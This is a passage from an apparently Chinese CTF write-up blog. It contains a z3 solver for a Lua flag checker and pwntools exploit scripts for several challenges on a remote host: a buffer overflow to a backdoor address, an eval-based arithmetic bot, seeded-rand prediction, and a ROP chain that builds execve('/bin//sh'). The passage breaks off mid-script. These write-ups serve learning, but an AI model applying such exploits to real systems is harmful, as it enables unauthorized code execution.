class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please input your flag:&quot;</span>)</span><br><span class="line">flag = <span class="built_in">io</span>.<span class="built_in">read</span>()</span><br><span class="line">code = &#123;&#125;</span><br><span class="line">secret = &#123;</span><br><span class="line">    <span class="number">54</span>, <span class="number">57</span>, <span class="number">566</span>, <span class="number">532</span>, <span class="number">1014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">508</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">498</span>, <span class="number">494</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">489</span>, <span class="number">492</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">490</span>, <span class="number">498</span>, <span class="number">517</span>, <span class="number">539</span>, <span class="number">21</span>, <span class="number">528</span>, <span class="number">517</span>, <span class="number">530</span>, <span class="number">543</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">562</span>, <span class="number">518</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">516</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">572</span>, <span class="number">2</span>, <span class="number">515</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">570</span>, <span class="number">553</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">594</span>, <span class="number">117</span>, <span class="number">15</span></span><br><span class="line">&#125;</span><br><span class="line">l = <span class="built_in">string</span>.<span class="built_in">len</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  num = ((<span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i) + i) % <span class="number">333</span> + <span class="number">444</span>) % <span class="number">555</span> - <span class="number">1</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(code, num)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  x = i - <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i + <span class="number">2</span> &gt;= l <span class="keyword">then</span></span><br><span class="line">    code[i] = code[i % l + <span class="number">1</span>] ~ code[(i + <span class="number">1</span>) % l + <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    code[i] = code[(i + <span class="number">1</span>) % l] ~ code[(i + <span class="number">2</span>) % l]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, l <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> secret[i] ~= code[i] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You win,flag is&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>z3约束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># z3 can&#x27;t solve problems like x%100==1(these mod value equation)</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver() </span><br><span class="line">secret = [<span class="number">54</span>, <span class="number">57</span>, <span class="number">566</span>, <span class="number">532</span>, <span class="number">1014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">508</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">498</span>, <span class="number">494</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">489</span>, <span class="number">492</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">490</span>, <span class="number">498</span>, <span class="number">517</span>, <span class="number">539</span>, <span class="number">21</span>,</span><br><span class="line">          <span class="number">528</span>, <span class="number">517</span>, <span class="number">530</span>, <span class="number">543</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">562</span>, <span class="number">518</span>, <span class="number">14</span>, <span class="number">527</span>, <span class="number">520</span>, <span class="number">0</span>, <span class="number">517</span>, <span class="number">57</span>, <span class="number">575</span>, <span class="number">512</span>, <span class="number">1</span>, <span class="number">572</span>, <span class="number">515</span>, <span class="number">60</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">1</span>,</span><br><span class="line">          <span class="number">594</span>, <span class="number">117</span>, <span class="number">15</span>]</span><br><span class="line">l = <span class="built_in">len</span>(secret)</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">12</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">code = flag[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    code[i] = code[i + <span class="number">1</span>] ^ code[i + <span class="number">2</span>]</span><br><span class="line">code[<span class="number">52</span>] = code[<span class="number">53</span>] ^ code[<span class="number">0</span>]</span><br><span class="line">code[<span class="number">53</span>] = code[<span class="number">0</span>] ^ code[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    s.add(secret[i] == code[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((x + b) % <span class="number">333</span> + <span class="number">444</span>) % <span class="number">555</span> - <span class="number">1</span> == a:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(crack(m[flag[i]], i + <span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]))</span><br></pre></td></tr></table></figure><blockquote><p>在这段代码中,m是Solver生成的一个模型,用于保存求解结果。</p><p>flag是一个由BitVec组成的列表,表示未知变量。</p><p>m[1]表示取模型m中键为1的值,但是m中没有键为整数1,所以会报错。</p><p>m[flag[1]]表示取models中键为flag[1]的值,相当于取键为flag列表中第二个元素的值。</p><p>flag列表在代码中初始化为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">Copy code</span><br><span class="line"></span><br><span class="line">flag = [BitVec(&#x27;[*]%d&#x27; % i , 12) for i in range(len)]</span><br></pre></td></tr></table></figure><p>所以flag[1]对应的是BitVec(‘[*]1’, 12),也就是第二个未知变量。</p><p>模型m中确实有这个键,所以可以正确打印出键为flag[1]的值。</p><p>总结一下:</p><p>m[1]: 错误访问,模型m没有整数键1</p><p>m[flag[1]]: 正确访问,取出模型中的第二个未知变量</p><p>所以两者输出不同,一个报错一个可以正确打印值。</p><p>区别在于m[flag[1]]通过flag列表 indirect 访问了模型的一个键,而m[1]直接以整数1为键访问,该键并不存在。</p></blockquote><h3 id="喵？喵。喵！"><a href="#喵？喵。喵！" class="headerlink" title="喵？喵。喵！"></a>喵？喵。喵！</h3><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="WEEK1-nc"><a href="#WEEK1-nc" class="headerlink" title="[WEEK1]nc"></a>[WEEK1]nc</h3><p>直接连上cat flag</p><h3 id="WEEK1-四则计算器"><a href="#WEEK1-四则计算器" class="headerlink" title="[WEEK1] 四则计算器"></a>[WEEK1] 四则计算器</h3><p>strlen遇到&#x2F;x00，停止读取来溢出，跳过长度判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ret2text&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">32774</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor = p64(<span class="number">0x4015E1</span>)</span><br><span class="line"></span><br><span class="line">pad = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x32</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = pad + backdoor</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="WEEK1-口算题"><a href="#WEEK1-口算题" class="headerlink" title="[WEEK1]口算题"></a>[WEEK1]口算题</h3><p>交互题目，但是其中包含了两unicode字符，我们修改一下将其解码成utf-8编码就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;start...&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    a = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    a = a[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">    a = a.replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    a = a.replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    r = <span class="built_in">eval</span>(a)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WEEK1-猜数游戏"><a href="#WEEK1-猜数游戏" class="headerlink" title="[WEEK1]猜数游戏"></a>[WEEK1]猜数游戏</h3><p>经典猜数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *   </span><br><span class="line">dll = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ip, port = <span class="string">&#x27;112.6.51.212:32778&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p = remote(ip ,port)</span><br><span class="line"></span><br><span class="line">a = dll.srand(dll.time(<span class="number">0</span>))</span><br><span class="line">b=dll.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;number?&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number?&#x27;</span>,<span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WEEK1-hard-nc"><a href="#WEEK1-hard-nc" class="headerlink" title="[WEEK1]hard nc"></a>[WEEK1]hard nc</h3><p>gift2里有个base64,解密即可</p><blockquote><p>MWYtOTdlNi0wMzBiNTNlNjdkODN9Cg&#x3D;&#x3D;</p></blockquote><p>ls -a，可以看到隐藏的文件，然后直接</p><blockquote><p>cd .gift    ##别忘了(.)</p></blockquote><h3 id="WEEK1-ropchain"><a href="#WEEK1-ropchain" class="headerlink" title="[WEEK1]ropchain"></a>[WEEK1]ropchain</h3><p>题目就已知是使用ROPgadget做了，那我们能干什么，直接顺从</p><blockquote><p>ROPgadget –binary 文件名 –ropchain</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;chal&#x27;)</span></span><br><span class="line">pl=remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">32783</span>)</span><br><span class="line"><span class="comment"># p=gdb.debug(&#x27;./chal&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node3.buuoj.cn&quot;,28477)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"><span class="comment"># elf=ELF(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span 